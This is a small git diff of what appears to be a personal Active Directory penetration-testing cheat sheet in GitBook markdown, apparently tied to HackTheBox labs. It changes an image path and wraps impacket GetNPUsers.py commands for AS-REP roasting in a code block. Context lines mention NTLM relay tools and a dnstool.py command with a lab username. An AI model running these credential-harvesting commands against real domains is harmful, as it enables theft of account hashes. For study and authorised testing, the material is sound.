@@ -8,7 +8,7 @@ krbrelayx, so many relays in impacket itself \[ntlmrelayx]
 
 {% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" %}
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 <div align="left"><figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure></div>
 
@@ -85,10 +85,12 @@ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUs
 
 #### GetNPUsers - ASREP Roasting for users with no pre-auth
 
+{% code title="18200" %}
 ```
 python3 GetNPUsers.py [domain]/ -dc-ip [ip] -usersfile userlist.txt
 ./GetNPUsers.py -no-pass -dc-ip [ip] -request '[domain]/[user]'
 ```
+{% endcode %}
 
 #### GetUserSPN - find Service Principal Names that are associated with normal user account
 
